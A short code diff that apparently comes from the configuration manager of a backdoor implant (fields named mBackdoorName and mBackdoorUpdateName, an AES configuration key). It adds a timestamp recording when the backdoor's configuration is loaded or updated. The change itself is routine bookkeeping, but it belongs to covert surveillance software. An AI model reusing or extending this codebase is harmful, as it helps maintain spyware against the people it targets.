@@ -32,6 +32,7 @@ static RCSIConfManager *sharedConfManager = nil;
 @implementation RCSIConfManager
 
 @synthesize mGlobalConfiguration, mBackdoorName, mBackdoorUpdateName, mShouldReloadConfiguration;
+@synthesize mConfigTimestamp;
 
 + (RCSIConfManager *)sharedInstance
 {
@@ -98,7 +99,7 @@ static RCSIConfManager *sharedConfManager = nil;
         
         if (self != nil)
           {
-
+            mConfigTimestamp = 0;
             NSData *temp = [NSData dataWithBytes: gConfAesKey
                                           length: CC_MD5_DIGEST_LENGTH];
             
@@ -185,6 +186,9 @@ static RCSIConfManager *sharedConfManager = nil;
   [configurationFile release];
   
   [pool release];
+  
+  if (bRet == TRUE)
+    time(&mConfigTimestamp);
   
   return bRet;
 }
@@ -298,6 +302,7 @@ static RCSIConfManager *sharedConfManager = nil;
                                                        error: nil])
             {
               mShouldReloadConfiguration = YES;
+              time(&mConfigTimestamp);
               [configUpdatePath release];
               [configurationName release];
               return TRUE;
